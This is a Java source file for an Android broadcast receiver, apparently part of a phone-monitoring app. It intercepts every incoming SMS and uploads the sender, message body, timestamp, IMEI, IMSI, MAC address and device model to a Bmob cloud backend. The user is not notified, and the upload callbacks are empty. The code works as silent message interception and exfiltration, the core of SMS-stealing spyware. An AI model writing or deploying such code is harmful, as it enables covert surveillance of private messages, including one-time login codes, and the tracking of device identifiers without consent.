package com.my.phonermon.broadcast;

import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import cn.bmob.v3.listener.SaveListener;

import com.my.phonermon.Constants;
import com.my.phonermon.MyApplication;
import com.my.phonermon.model.network.NetSMS;
import com.my.phonermon.utils.LogUtils;
import com.my.phonermon.utils.PackageUtils;
import com.my.phonermon.utils.SPUtils;
import com.my.phonermon.utils.ToastUtils;
@Deprecated
public class SMSReceiver extends BroadcastReceiver {
	
	private static final String TAG = SMSReceiver.class.getSimpleName();

	@Override
	public void onReceive(Context context, Intent intent) {
		LogUtils.i(TAG, "onReceive");
		
		Bundle bundle = intent.getExtras();
		Object messages[] = (Object[]) bundle.get("pdus");
		if (messages != null && messages.length > 0) {
			SmsMessage smsMessage[] = new SmsMessage[messages.length];
			for (int n = 0; n < smsMessage.length; n++) {
				smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
			}
			for (SmsMessage message : smsMessage) {
				NetSMS sms = new NetSMS();
				sms.setBrand(android.os.Build.BRAND);
				sms.setImei(PackageUtils.getIMEI());
				sms.setImsi(PackageUtils.getIMSI());
				sms.setMac(PackageUtils.getMAC());
				sms.setModel(android.os.Build.MODEL);
				SPUtils spUtils = new SPUtils(MyApplication.getMe());
				sms.setReceiver(spUtils.getString(Constants.SharedPrefs.LOCAL_PHONE, ""));
				sms.setSender(message.getOriginatingAddress());
				sms.setSenderTime(new Date(message.getTimestampMillis()));
				sms.setSmsMsg(message.getMessageBody());
				sms.setStatus(NetSMS.Receive);
				sms.save(context, new SaveListener() {
					@Override
					public void onSuccess() {
					}
					
					@Override
					public void onFailure(int code, String msg) {
					}
				});
			}

		}
	}

}
